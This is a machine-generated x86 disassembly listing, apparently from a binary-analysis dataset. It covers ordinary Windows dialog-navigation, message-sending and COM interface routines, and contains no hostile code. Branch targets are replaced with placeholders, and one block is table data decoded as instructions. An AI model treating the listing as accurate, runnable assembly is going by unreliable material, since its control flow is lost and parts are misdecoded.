push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x3
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x34 ]
xor edi edi
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov cl [ ebp - 0x35 ]
push edi
push 0x11
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x4
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov cl [ ebp - 0x28 ]
jmp r-xdata
push edi
push 0x12
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
dec eax
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x5
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
dec eax
je r-xdata
mov [ eax ] cl
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
push edi
push 0x13
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x6
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov edx [ ecx + 0x10 ]
fld [ ebp - 0x28 ]
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
fstp [ eax ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
push edi
push 0x7
lea ecx [ ebp - 0x30 ]
call sub_42674e
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_42a883
test al al
je r-xdata
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
sub_42bdd4
push ebx
push esi
mov esi ecx
push edi
xor eax eax
xor ebx ebx
mov ecx [ esi + 0x8 ]
mov edi [ ecx + 0x4 ]
test edi edi
jbe r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov ecx esi
call sub_42bdfc
test eax eax
jl r-xdata
inc ebx
cmp ebx edi
jb r-xdata
sub_42bdfc
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
mov eax 0x80004002
mov eax [ ecx + 0x8 ]
push esi
push edi
mov edi [ esp + 0xc ]
mov esi [ eax + 0x8 ]
mov eax [ eax ]
push esi
mov eax [ eax + edi * 8 ]
mov edi [ edx ]
push eax
push [ ecx + 0xc ]
push edx
call [ edi + 0x10 ]
pop edi
pop esi
jmp r-xdata
retn 0x4
sub_42be42
mov eax sub_464878
call sub_42dc88
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
push [ esi + 0xc ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ esi + 0x18 ] eax
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
call sub_441eb2
imul edi edi 0x34
push edi
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_441e89
pop ecx
mov [ esi + 0xc ] eax
pop ecx
jmp r-xdata
mov eax [ esi + 0xc ]
mov ecx [ ebp - 0xc ]
neg eax
sbb eax eax
pop edi
and eax 0x7ff8fff2
pop esi
add eax 0x8007000e
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
sub_42beb9
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
xor edx edx
push esi
cmp eax edx
mov esi ecx
je r-xdata
xor eax eax
sub eax [ esi + 0x8 ]
jmp r-xdata
xor ecx ecx
sub ecx [ esi + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x18 ]
cmp ecx edx
je r-xdata
push edx
push eax
mov eax [ ebp + 0x14 ]
push ecx
sub eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x14 ]
imul eax eax 0x34
push edx
push edx
push edx
add eax [ esi + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_42a65c
add esp 0x2c
inc [ esi + 0x14 ]
pop esi
pop ebp
retn 0x18
sub_42bf0d
mov eax sub_46488c
call sub_42dc88
push ecx
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi ecx
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx [ eax ]
push edx
push rw-data
push eax
call [ ecx ]
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push [ ebp - 0x10 ]
push [ esi + 0x18 ]
push [ esi ]
push [ esi + 0x10 ]
push [ esi + 0xc ]
call sub_42a612
or [ ebp - 0x4 ] 0xffffffff
mov esi eax
mov eax [ ebp - 0x10 ]
add esp 0x14
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_42a5b6
mov ebx eax
test ebx ebx
jge r-xdata
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
mov eax esi
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esi ]
mov [ eax + 0x4 ] 0x1
sub_42bfec
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x80010001
je r-xdata
pop esi
leave
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ eax + 0x4c ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov ecx esi
call sub_42c06f
test eax eax
je r-xdata
lea edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
push edx
xor edx edx
cmp [ esi + 0xc ] edx
mov ecx [ eax ]
setne dl
push edx
push [ esi + 0x8 ]
push eax
call [ ecx + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
push 0xd
pop edx
cmp [ ecx + 0x88 ] 0x0
je r-xdata
mov ecx [ esi ]
push edi
push eax
push edx
push [ esi + 0x8 ]
mov edi [ ecx ]
push ecx
call [ edi + 0x68 ]
add esp 0x10
pop edi
mov edx 0x800d
sub_42c06f
push esi
mov esi ecx
mov ecx [ esi + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov eax [ esi + 0xc ]
push 0x1
push esi
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x88 ]
mov eax [ ecx ]
call [ eax ]
pop esi
retn
xor eax eax
pop esi
retn
sub_42c0a5
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov ecx [ ecx + 0x8c ]
and [ eax ] 0x0
xor eax eax
retn 0xc
mov eax [ ecx + 0x8 ]
cmp eax [ esp + 0x4 ]
je r-xdata
call sub_42c06f
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
call sub_42bfe8
mov ecx eax
jmp r-xdata
test ecx ecx
je r-xdata
sub_42c13e
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push eax
mov [ ecx ] eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_42c188
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x1
push esi
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
call sub_42c345
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
retn 0x10
mov esi [ esi ]
cmp esi 0x1e
je r-xdata
xor eax eax
cmp esi 0x2
je r-xdata
cmp esi 0x3
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x1
jne r-xdata
mov ecx [ edi - 0x4c ]
test ecx ecx
je r-xdata
cmp esi 0x1
je r-xdata
test eax eax
je r-xdata
cmp esi 0x14
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x14 ]
jmp r-xdata
sub_42c204
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x3
push esi
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
call sub_42c345
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
retn 0x10
mov esi [ esi ]
cmp esi 0x2
je r-xdata
mov ecx [ edi - 0x4c ]
test ecx ecx
je r-xdata
cmp esi 0x3
je r-xdata
xor eax eax
test [ ebp + 0xc ] 0x80
je r-xdata
cmp esi 0x14
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x14 ]
sub_42c28e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
push 0x6
push esi
push [ ebp + 0x10 ]
mov ecx edi
push [ ebp + 0xc ]
call sub_42c345
test eax eax
jl r-xdata
pop edi
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
mov esi [ edi - 0x4c ]
test esi esi
je r-xdata
xor eax eax
cmp [ esi + 0x44 ] 0x0
jne r-xdata
cmp eax 0x1f
je r-xdata
cmp eax 0x1e
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
cmp eax 0x2
je r-xdata
cmp eax 0x3
je r-xdata
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_42aac8
mov eax [ esi ]
and [ esi + 0x44 ] 0x0
mov ecx esi
call [ eax + 0x10 ]
sub_42c2f7
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0x7
mov ecx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42c345
test eax eax
jl r-xdata
pop esi
pop ebp
retn 0x10
mov esi [ esi - 0x4c ]
test esi esi
je r-xdata
xor eax eax
test [ ebp + 0xc ] 0x80
je r-xdata
push edi
mov edi [ esi + 0x44 ]
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_42aac8
mov eax [ esi ]
mov ecx esi
mov [ esi + 0x44 ] edi
call [ eax + 0x10 ]
pop edi
sub_42c345
push ebp
mov ebp esp
sub esp 0x24
test [ ebp + 0x8 ] 0x3
push esi
push edi
lea edi [ ecx - 0xd4 ]
je r-xdata
xor eax eax
xor edx edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
mov ecx [ ebp + 0x10 ]
inc edx
add ecx 0x24
cmp edx [ ebp + 0xc ]
jae r-xdata
movzx eax [ eax + lookup_table_42c3ea ]
jmp [ eax * 4 + jump_table_42c3ca ]
jmp r-xdata
push 0x1
jmp r-xdata
push 0x7
jmp r-xdata
push 0x5
jmp r-xdata
push 0x4
jmp r-xdata
push 0x6
jmp r-xdata
push 0x3
jmp r-xdata
push 0x2
mov eax [ ecx ]
dec eax
cmp eax 0x1e
ja r-xdata
pop esi
lea ecx [ ebp - 0x24 ]
push 0x3
call sub_42c6b3
mov eax [ ebp + 0x14 ]
mov ecx edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x4 ] esi
call sub_428989
mov eax [ ebp - 0xc ]
jmp r-xdata
pop edi
pop esi
leave
retn 0x10
sub_42c3f2
add al [ edx ]
add eax [ ebx ]
pop es
pop es
add eax [ ebx ]
pop es
pop es
add eax [ ecx ]
add eax [ edi ]
add al [ eax + 0x7070707 ]
pop es
push es
xor eax eax
retn 0x4
sub_42c40e
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push eax
mov [ ecx ] eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
push 0x10
push r--data
push [ esp + 0x10 ]
call sub_42dcf0
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
retn 0xc
sub_42c458
push ebp
mov ebp esp
sub esp 0x24
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea edi [ eax - 0xd8 ]
mov eax [ ebp + 0x20 ]
xor ebx ebx
sub eax ebx
je r-xdata
push 0x1
jmp r-xdata
dec eax
je r-xdata
pop ebx
jmp r-xdata
push 0x4
dec eax
je r-xdata
push 0x3
lea ecx [ ebp - 0x24 ]
call sub_42c6b3
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x6
call sub_428989
mov eax [ ebp - 0xc ]
push 0x6
jmp r-xdata
dec eax
je r-xdata
push 0x5
jmp r-xdata
dec eax
jne r-xdata
mov esi [ edi + 0x88 ]
push 0x7
test esi esi
pop ebx
jne r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_42aac8
mov eax [ esi ]
and [ esi + 0x44 ] 0x0
mov ecx esi
call [ eax + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn 0x20
sub_42c4e9
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x7
lea esi [ eax - 0xd8 ]
mov eax [ ebp + 0x1c ]
pop edi
xor ebx ebx
push 0x4
sub eax ebx
mov [ ebp - 0x4 ] esi
mov [ ebp + 0x8 ] ebx
pop edx
je r-xdata
mov [ ebp + 0x8 ] 0x1
dec eax
je r-xdata
mov ebx edi
sub eax ecx
je r-xdata
mov [ ebp + 0x8 ] edx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
cmp ebx ecx
jne r-xdata
push 0x3
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x18 ]
push 0x2
sub eax edx
pop ecx
je r-xdata
mov [ ebp + 0x8 ] 0x6
jmp r-xdata
dec eax
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
pop ebx
jmp r-xdata
push 0x5
sub eax 0x5
jne r-xdata
mov [ ebp + 0x8 ] 0x5
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x6
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
jmp r-xdata
mov esi [ esi + 0x88 ]
test esi esi
je r-xdata
mov ebx ecx
jmp r-xdata
mov [ ebp + 0x8 ] edi
jmp r-xdata
test ebx ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ esi + 0x50 ]
mov ecx [ ecx ]
mov [ eax + 0xc ] ecx
mov edi [ esi + 0x44 ]
mov ecx esi
mov [ esi + 0x44 ] 0x1
call sub_42aac8
test edi edi
mov [ esi + 0x44 ] edi
jne r-xdata
push 0x3
lea ecx [ ebp - 0x28 ]
call sub_42c6b3
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x28 ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_428989
mov eax [ ebp - 0x10 ]
test eax eax
jl r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn 0x1c
sub_42c5fe
cmp [ esp + 0xc ] 0xe
push esi
jne r-xdata
xor eax eax
pop esi
retn 0x14
mov eax [ esp + 0x8 ]
mov esi [ eax - 0x50 ]
test esi esi
je r-xdata
mov eax [ esi + 0x50 ]
mov ecx [ esi + 0x54 ]
push [ eax ]
call sub_429b46
mov ecx [ esi + 0x54 ]
call sub_429c67
mov eax [ esi + 0x50 ]
mov ecx [ esi + 0x54 ]
push [ eax ]
call sub_42a305
mov eax [ esi + 0x54 ]
mov eax [ eax + 0xc ]
cmp [ esi + 0x10 ] eax
je r-xdata
push [ esi + 0x14 ]
mov [ esi + 0x10 ] eax
call [ CoTaskMemFree@IAT ]
mov eax [ esi + 0x10 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call [ CoTaskMemAlloc@IAT ]
mov [ esi + 0x14 ] eax
mov esi [ esi + 0x10 ]
lea ecx [ esi + esi * 4 ]
shl ecx 0x3
push ecx
push 0x0
push eax
call sub_42dc30
add esp 0xc
sub_42c685
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
mov esi [ esp + 0xc ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ edi ]
push edi
call [ eax + 0x4 ]
mov [ esi ] edi
mov eax edi
pop edi
pop esi
retn 0x8
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_42c6d6
mov edx [ esp + 0x4 ]
test edx edx
jne r-xdata
mov ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x8 ]
xor eax eax
jmp r-xdata
retn 0x8
push ecx
push eax
push 0x87
push [ edx + 0x1c ]
call [ SendMessageA@IAT ]
sub_42c704
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call sub_42c6d6
test al 0x8
je r-xdata
mov ecx esi
call sub_441868
pop esi
retn 0x4
push 0xffffffff
push 0x0
push 0xb1
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
sub_42c732
push ebx
push esi
mov esi [ esp + 0x10 ]
xor ebx ebx
test esi esi
push edi
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn 0x8
mov edi [ GetWindowLongA@IAT ]
cmp esi [ esp + 0x10 ]
je r-xdata
push [ esi + 0x1c ]
mov ebx esi
call [ GetParent@IAT ]
push eax
call sub_43e7b3
mov esi eax
push 0xffffffec
push [ esi + 0x1c ]
call edi
test eax 0x10000
jne r-xdata
test esi esi
jne r-xdata
push 0xfffffff0
push [ esi + 0x1c ]
call edi
and eax 0xc0000000
cmp eax 0x40000000
jne r-xdata
sub_42c78b
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
test esi esi
je r-xdata
mov ebp [ esp + 0x10 ]
mov eax [ esi + 0x1c ]
mov edi [ GetWindow@IAT ]
push 0x2
push eax
call edi
push eax
call sub_43e7b3
test eax eax
mov ebp [ esp + 0x10 ]
jne r-xdata
push ebx
push 0xffffffec
push [ esi + 0x1c ]
call [ GetWindowLongA@IAT ]
test eax 0x10000
je r-xdata
mov eax ebp
jmp r-xdata
mov esi [ esi + 0x1c ]
push 0x2
push esi
call edi
push eax
call sub_43e7b3
mov esi eax
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
push eax
push ebp
call sub_42c732
mov esi eax
test esi esi
je r-xdata
mov eax esi
pop ebx
mov ebx [ esp + 0x1c ]
test bl 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push [ ebp + 0x1c ]
call [ GetTopWindow@IAT ]
push eax
call sub_43e7b3
mov esi eax
test esi esi
jne r-xdata
cmp esi ebp
je r-xdata
test bl 0x2
je r-xdata
push [ esi + 0x1c ]
call [ IsWindowVisible@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
push 0x2
push eax
call edi
push eax
call sub_43e7b3
test eax eax
je r-xdata
push ebx
push 0x0
push esi
mov ecx esi
call sub_441826
test eax eax
jne r-xdata
push ebx
push esi
push ebp
jmp r-xdata
call sub_42c78b
mov esi eax
sub_42c867
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
xor eax eax
retn
push [ esp + 0x8 ]
call sub_4287dd
test eax eax
je r-xdata
push 0x1
pop eax
retn
sub_42c886
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
xor ebx ebx
push edi
call sub_42c732
mov esi eax
push 0x0
push esi
push [ edi + 0x1c ]
call [ GetNextDlgGroupItem@IAT ]
push eax
call sub_43e7b3
mov esi eax
test esi esi
je r-xdata
mov esi [ esi + 0x1c ]
push [ ebp + 0xc ]
push edi
call sub_42c732
mov ebx eax
mov esi ebx
inc ebx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
cmp esi ebx
jne r-xdata
cmp ebx 0x3c
jg r-xdata
push 0x3
push esi
push edi
call sub_42c78b
push [ ebp + 0x10 ]
mov esi eax
push esi
call sub_42c867
pop ecx
test eax eax
pop ecx
jne r-xdata
jmp r-xdata
push [ ebp + 0x10 ]
push esi
call sub_42c867
pop ecx
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
test esi esi
je r-xdata
sub_42c90b
push esi
mov esi [ esp + 0x8 ]
mov ecx esi
call sub_441826
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
test [ eax + 0x71 ] 0x20
je r-xdata
push 0x1
pop eax
pop esi
retn
sub_42c931
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
xor eax eax
push esi
call sub_42c90b
test eax eax
pop ecx
je r-xdata
mov ecx esi
call sub_441826
test eax eax
jne r-xdata
push 0x0
push [ esi + 0x1c ]
push [ edi + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_43e7b3
mov esi eax
test esi esi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
test ebx ebx
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x200
jl r-xdata
mov ebx esi
push [ ebp + 0x10 ]
push esi
push edi
call sub_42c886
mov esi eax
test esi esi
je r-xdata
sub_42c9a6
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
xor esi esi
test eax eax
je r-xdata
mov esi [ eax + 0x38 ]
test esi esi
jne r-xdata
test edi edi
jne r-xdata
push [ eax + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xac ]
call [ GetFocus@IAT ]
push eax
call sub_43e7b3
cmp eax ebx
je r-xdata
mov edi [ eax + 0x34 ]
test edi edi
jne r-xdata
mov ecx ebx
call sub_441868
sub_42ca03
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
je r-xdata
pop edi
pop esi
retn
push [ esi + 0x1c ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
push [ esi + 0x1c ]
mov esi [ GetParent@IAT ]
mov edi [ eax + 0x34 ]
test edi edi
jne r-xdata
mov eax [ edi + 0x48 ]
test eax eax
je r-xdata
push [ eax + 0x1c ]
jmp r-xdata
push [ eax + 0x20 ]
call sub_43e7b3
test eax eax
je r-xdata
call esi
push eax
call sub_43e7b3
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx eax
je r-xdata
test ecx ecx
je r-xdata
mov eax [ edi ]
push 0x0
mov ecx edi
call [ eax + 0x5c ]
push [ ecx + 0x1c ]
push [ eax + 0x1c ]
call [ IsChild@IAT ]
test eax eax
jne r-xdata
sub_42ca76
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
push [ esp + 0x14 ]
mov ecx ebx
call sub_441585
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push 0x1
push eax
push ebx
call sub_42c78b
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
mov esi edi
mov ecx edi
mov eax esi
jmp r-xdata
push 0x1
push esi
push ebx
call sub_42c78b
mov esi eax
test esi esi
je r-xdata
cmp esi edi
je r-xdata
mov ecx esi
jmp r-xdata
call sub_44172b
cmp eax [ esp + 0x14 ]
je r-xdata
sub_42cacd
push esi
mov esi [ esp + 0x8 ]
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
push 0x0
push esi
call sub_42c6d6
mov ecx [ esp + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x10
add ecx 0x10
test ecx eax
je r-xdata
push [ esp + 0xc ]
call sub_4284ff
pop esi
retn
pop esi
retn
xor eax eax
push 0x1
cmp [ esp + 0x10 ] eax
setne al
push eax
push 0xf4
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
sub_42cb1a
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
retn
push 0x0
push eax
call sub_42c6d6
and eax 0x30
retn
jmp sub_4284e7
sub_42cb3b
push esi
mov esi [ esp + 0xc ]
test esi esi
push edi
je r-xdata
push 0x3
push 0x0
push [ esp + 0x14 ]
call sub_42c78b
push 0xffffffec
push [ esi + 0x1c ]
call [ GetWindowLongA@IAT ]
test eax 0x10000
jne r-xdata
pop edi
pop esi
retn 0x8
mov esi edi
push esi
push [ esp + 0x10 ]
call sub_42c732
jmp r-xdata
cmp esi edi
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push 0x0
push esi
call sub_42cacd
pop ecx
pop ecx
push 0x0
push esi
push [ esp + 0x14 ]
call sub_42c78b
mov esi eax
test esi esi
je r-xdata
sub_42cb9d
mov eax [ esp + 0x4 ]
push 0x0
push 0x0
push 0x400
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
mov ecx eax
shr ecx 0x10
cmp cx 0x534b
jne r-xdata
push 0x1
pop eax
movzx eax ax
jmp r-xdata
retn 0x4
sub_42cbca
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
jne r-xdata
mov eax [ edi + 0x1c ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
test edi edi
je r-xdata
mov ebx [ ebp + 0x8 ]
push eax
push [ ebx + 0x1c ]
call [ IsChild@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax edi
jne r-xdata
push 0xffffffec
